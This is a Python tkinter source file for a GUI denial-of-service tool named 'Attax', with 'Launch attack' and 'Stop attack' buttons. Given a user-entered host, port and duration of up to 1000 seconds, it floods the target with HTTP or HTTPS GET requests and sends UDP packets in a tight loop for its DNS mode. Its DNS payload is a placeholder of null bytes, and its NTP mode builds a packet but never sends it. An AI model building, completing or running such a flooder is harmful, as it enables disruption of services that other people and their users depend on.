from tkinter import *
import tkinter as tk
import socket
import requests
import time
import os
import platform
import sys
from threading import Thread, Event

stop_event = Event()
font_settings = ("Arial")
text_color = "black"
theme = "lightblue"
clr = theme
duration = 0
x = 0

if platform.system() == 'Linux':
    os.system("clear")
else:
    os.system("cls")


def open_options_window():
    options_window = tk.Toplevel(root)
    options_window.geometry("400x200")
    options_window.configure(bg="white")
    theme_var = StringVar(value=theme)
    options_window.title("Options:")

    d = Label(options_window, text='OPTIONS:', font=("Arial", 20))
    d.configure(bg="white")
    d.place(x = 150 , y = 2)

    
    theme_button = tk.Button(options_window, text="Change theme", command=change_theme)
    theme_button.place(x=50 , y=50)
  

def update_timer(duration):
    for i in range(duration):
        if stop_event.is_set():
            break
        timer_var.set(str(i + 1))
        timer_entry.delete(1.0, tk.END)
        timer_entry.insert(tk.END, timer_var.get())
        time.sleep(1)

    # Reset timer when done
    timer_var.set(str(duration))
    timer_entry.delete(1.0, tk.END)
    timer_entry.insert(tk.END, timer_var.get())


def create_dns_query(domain):
    # This should create a valid DNS query; here is a simplified example
    # In a real scenario, you'd create a proper DNS query packet
    return b'\x00' * 12 

def send_DNS_packets(host, port, duration):
    domain = host
    query = create_dns_query(domain)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packets_sent = 0
    console_var.set(f"Sending DNS packets to {host}:{port} for {duration} seconds...")
    console_entry.delete(1.0, tk.END)  # Clear previous console entries
    console_entry.insert(tk.END, console_var.get() + "\n")  # Insert the message

    while time.time() < end_time and not stop_event.is_set():
        sock.sendto(query, (host, port))
        packets_sent += 1

    console_var.set(f"Sent {packets_sent} DNS packets.")
    console_entry.insert(tk.END, console_var.get() + "\n")  # Update console with packets sent


def send_NTP_packets(host, port, duration):
    ntp_server = host  # Use the input host as the NTP server
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ntp_packet = b'\x1b' + 47 * b'\0'  # Basic NTP request packet (1b indicates version and mode)
    
    console_var.set(f"Sending NTP requests to {ntp_server} for {duration} seconds...")
    console_entry.delete(1.0, tk.END)  # Clear previous console entries
    console_entry.insert(tk.END, console_var.get() + "\n")  # Insert the message

    # Add sending logic as required

def send_http_requests(protocol, host, port, duration):
    timeout = time.time() + duration
    url = f"{protocol}://{host}:{port}"

    console_var.set(f"Sending HTTP requests to {url} for {duration} seconds...")
    console_entry.delete(1.0, tk.END)  # Clear previous console entries
    console_entry.insert(tk.END, console_var.get() + "\n")  # Insert the message

    while time.time() < timeout and not stop_event.is_set():
        try:
            response = requests.get(url)
            status = f"Response status code: {response.status_code}"
            status_var.set(status)
            console_entry.insert(tk.END, status + "\n")  # Update console with response
        except requests.exceptions.RequestException as e:
            error_msg = f"Error sending request: {e}"
            status_var.set(error_msg)
            console_entry.insert(tk.END, error_msg + "\n")  # Update console with error message

def send_https_requests(protocol, host, port, duration):
    timeout = time.time() + duration
    url = f"{protocol}://{host}:{port}"

    console_var.set(f"Sending HTTPS requests to {url} for {duration} seconds...")
    console_entry.delete(1.0, tk.END)  # Clear previous console entries
    console_entry.insert(tk.END, console_var.get() + "\n")  # Insert the message

    while time.time() < timeout and not stop_event.is_set():
        try:
            response = requests.get(url)
            status = f"Response status code: {response.status_code}"
            status_var.set(status)
            console_entry.insert(tk.END, status + "\n")  # Update console with response
        except requests.exceptions.RequestException as e:
            error_msg = f"Error sending request: {e}"
            status_var.set(error_msg)
            console_entry.insert(tk.END, error_msg + "\n")  # Update console with error message

def save_input():
    global stop_event  
    protocol = protocol_var.get()
    host = host_entry.get().strip()
    port_str = port_entry.get().strip()
    
    try:
        port = int(port_str)
    except ValueError:
        console_var.set("Invalid port number.")
        return

    duration = int(duration_scale.get())

    if not host:
        status_var.set("Host cannot be empty.")
        return
    stop_event.clear()

    thread = None

    if protocol == 'http':
        thread = Thread(target=send_http_requests, args=(protocol, host, port, duration))
    elif protocol == 'https':
        thread = Thread(target=send_https_requests, args=(protocol, host, port, duration))
    elif protocol == 'NTP':
        thread = Thread(target=send_NTP_packets, args=(host, port, duration))
    elif protocol == 'DNS':
        thread = Thread(target=send_DNS_packets, args=(host, port, duration))

    timer_thread = Thread(target=update_timer, args=(duration,))
    if thread is not None:
        thread.start()
        timer_thread.start()
    else:
        console_var.set("No valid protocol selected.")

def stop_requests():
    stop_event.set()  
    msg ="Requests stopped."
    console_entry.insert(tk.END, msg + "\n")
    timer_var.set("0")
    
def change_theme():
    global theme
    font_settings = ("Arial")
    text_color = "black"
    if theme == 'lightblue':
        theme = "#00ff07"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
    elif theme == "#00ff07":
        theme = "lightyellow"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
    elif theme == "lightyellow":
        theme = "pink"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
    elif theme == "pink":
        theme = "#00a5ff"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
    elif theme == "#00a5ff":
        theme = "white"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
    elif theme == "white":
        theme = "grey"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
    elif theme == "grey":
        theme = "#6814eb"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
    elif theme == "#6814eb":
        theme = "black"
        text_color = "lime"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
    elif theme == "black":
        theme = "#1a1919"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
        text_color = "white"
    elif theme == "#1a1919":
        theme = "lightblue"
        text_color = "black"
        msg = "theme changed to " , theme
        console_entry.insert(tk.END, msg)
        
    root.config(bg=theme)
    w.config(bg=theme , fg=text_color )
    status_label.config(bg=theme, font=font_settings, fg=text_color)
    protocol_label.config(bg=theme, font=font_settings, fg=text_color)
    http_radio.config(bg=theme, font=font_settings, fg=text_color)
    https_radio.config(bg=theme, font=font_settings, fg=text_color)
    host_label.config(bg=theme, font=font_settings, fg=text_color)
    port_label.config(bg=theme, font=font_settings, fg=text_color)
    duration_label.config(bg=theme, font=font_settings, fg=text_color)
    NTP_radio.config(bg=theme, font=font_settings, fg=text_color)
    DNS_radio.config(bg=theme, font=font_settings, fg=text_color)
    console_label.config(bg=theme, font=font_settings, fg=text_color)
##    timer_label.config(bg=theme, font=font_settings, fg=text_color)


def exit_application():
    stop_requests()
    root.destroy()


def clear_console():
    console_entry.delete(1.0, tk.END)
    status_var.set("")
    timer_var.set("0")
    timer_var.set("clear!")
    timer_var.set("0")


root = tk.Tk()
root.geometry("1000x500")
root.configure(bg=clr)
root.title("Attax")
theme_var = StringVar(value=theme)

w = Label(root, text='A T T A X _  D O S', font=("Arial", 20))
w.configure(bg=clr)
w.place(x=150, y=75)

status_label = Label(root, text="Status:", bg=theme)
status_label.place(x=50, y=160)
status_var = tk.StringVar(value="waiting for input...")
status_entry = tk.Entry(root, textvariable=status_var, width=30, bg="white")
status_entry.place(x=150, y=160)

timer_var = tk.StringVar(value="0")
timer_entry = tk.Text(root, width=10, height=1, bg="white")  # Adjust height as needed
timer_entry.insert(tk.END, timer_var.get())
timer_entry.place(x=400, y=160)

labels = Label(root,bg="lightgrey", width=1000 ,height=2)
labels.place(x=0, y=-10)

console_label = Label(root, text="console:", bg=theme)
console_label.place(x=700, y=120)
console_var = tk.StringVar(value="waiting for input...")
console_entry = tk.Text(root, width=50, height=10, bg="white")  # Adjust height as needed
console_entry.insert(tk.END, console_var.get())  # Insert initial value

console_entry.place(x=550, y=160)

protocol_var = StringVar(value='http')
#protocols
protocol_label = Label(root, text="Protocol:", bg=clr)
protocol_label.place(x=50, y=200)

http_radio = Radiobutton(root, text="HTTP", variable=protocol_var, value='http', bg=clr)
http_radio.place(x=150, y=200)

https_radio = Radiobutton(root, text="HTTPS", variable=protocol_var, value='https', bg=clr)
https_radio.place(x=225, y=200)

NTP_radio = Radiobutton(root, text="NTP", variable=protocol_var, value='NTP', bg=clr)
NTP_radio.place(x=310, y=200)

DNS_radio = Radiobutton(root, text="DNS", variable=protocol_var, value='DNS', bg=clr)
DNS_radio.place(x=375, y=200)
#
host_label = Label(root, text="Host:", bg=clr)
host_label.place(x=50, y=240)
host_entry = tk.Entry(root, width=30)
host_entry.place(x=150, y=240)

port_label = Label(root, text="Port:", bg=clr)
port_label.place(x=50, y=280)
port_entry = tk.Entry(root, width=30)
port_entry.place(x=150, y=280)

duration_label = Label(root, text="Duration:", bg=clr)
duration_label.place(x=50, y=320)
duration_scale = tk.Scale(root, from_=1, to=1000, orient=HORIZONTAL, length=250)
duration_scale.set(1)
duration_scale.place(x=150, y=320)

save_button = tk.Button(root, text="Launch attack", command=save_input)
save_button.place(x=125, y=400)

stop_button = tk.Button(root, text="Stop attack", command=stop_requests)
stop_button.place(x=345, y=400)

clear_button = tk.Button(root, text="Clear Console", command=clear_console)
clear_button.place(x=550, y=400)

exit_button = tk.Button(root, text="Exit", command=exit_application)
exit_button.place(x=1, y=1)

options_button = tk.Button(root, text="Options", command=open_options_window)
options_button.place(x=50, y=1)



root.config(bg=theme)
w.config(bg=theme , fg=text_color )
status_label.config(bg=theme, font=font_settings, fg=text_color)
protocol_label.config(bg=theme, font=font_settings, fg=text_color)
http_radio.config(bg=theme, font=font_settings, fg=text_color)
https_radio.config(bg=theme, font=font_settings, fg=text_color)
host_label.config(bg=theme, font=font_settings, fg=text_color)
port_label.config(bg=theme, font=font_settings, fg=text_color)
duration_label.config(bg=theme, font=font_settings, fg=text_color)
NTP_radio.config(bg=theme, font=font_settings, fg=text_color)
DNS_radio.config(bg=theme, font=font_settings, fg=text_color)


root.mainloop()
